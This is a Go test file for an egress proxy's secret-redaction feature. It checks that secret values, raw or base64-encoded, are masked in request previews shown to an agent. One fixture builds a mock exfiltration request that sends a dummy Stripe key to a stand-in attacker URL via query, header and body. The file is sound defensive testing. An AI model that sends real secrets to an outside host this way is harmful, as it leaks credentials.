package egress

import (
	"encoding/base64"
	"strings"
	"testing"
)

func newRedactProxy(secrets ...SecretValue) *Proxy {
	return New(Config{RedactSecrets: secrets}, nil)
}

func TestRedactPreview_RawValueInBodyHeaderQuery(t *testing.T) {
	secret := "sk_live_51H8xVerySecretValue"
	p := newRedactProxy(SecretValue{Name: "STRIPE_SECRET_KEY", Value: secret})

	prev := &PreviewRequest{
		Method: "POST",
		URL:    "https://exfil.attacker.net/collect?k=" + secret,
		Header: map[string][]string{"Authorization": {"Bearer " + secret}},
		Body:   []byte(`{"key":"` + secret + `","note":"hi"}`),
	}
	got := p.redactPreview(prev)

	marker := "«STRIPE_SECRET_KEY»"
	if strings.Contains(string(got.Body), secret) {
		t.Error("raw secret still present in redacted body")
	}
	if !strings.Contains(string(got.Body), marker) {
		t.Errorf("marker missing from body: %s", got.Body)
	}
	if strings.Contains(got.URL, secret) || !strings.Contains(got.URL, marker) {
		t.Errorf("query not redacted: %s", got.URL)
	}
	if h := got.Header["Authorization"][0]; strings.Contains(h, secret) || !strings.Contains(h, marker) {
		t.Errorf("header not redacted: %s", h)
	}
	// The non-secret content is untouched, so the agent can still read the request.
	if !strings.Contains(string(got.Body), `"note":"hi"`) {
		t.Errorf("benign content lost: %s", got.Body)
	}
	// Redaction must not mutate the caller's original preview.
	if !strings.Contains(string(prev.Body), secret) {
		t.Error("redaction mutated the original preview")
	}
}

func TestRedactPreview_Base64Encoded(t *testing.T) {
	secret := "hunter2-a-long-enough-secret"
	p := newRedactProxy(SecretValue{Name: "TOKEN", Value: secret})
	enc := base64.StdEncoding.EncodeToString([]byte(secret))

	got := p.redactPreview(&PreviewRequest{Body: []byte(`{"b64":"` + enc + `"}`)})
	if strings.Contains(string(got.Body), enc) {
		t.Errorf("base64-encoded secret not redacted: %s", got.Body)
	}
	if !strings.Contains(string(got.Body), "«TOKEN»") {
		t.Errorf("marker missing: %s", got.Body)
	}
}

func TestRedactPreview_ShortValueNotRedacted(t *testing.T) {
	// A too-short value would match benign text everywhere, so it is skipped.
	p := newRedactProxy(SecretValue{Name: "PIN", Value: "abc"})
	body := []byte("the alphabet abc appears in words")
	got := p.redactPreview(&PreviewRequest{Body: body})
	if string(got.Body) != string(body) {
		t.Errorf("short value should not be redacted, got %s", got.Body)
	}
}

func TestRedactPreview_NoSecretsIsPassthrough(t *testing.T) {
	p := newRedactProxy()
	prev := &PreviewRequest{Body: []byte("anything")}
	if got := p.redactPreview(prev); got != prev {
		t.Error("with no secrets configured redactPreview should return the input unchanged")
	}
}
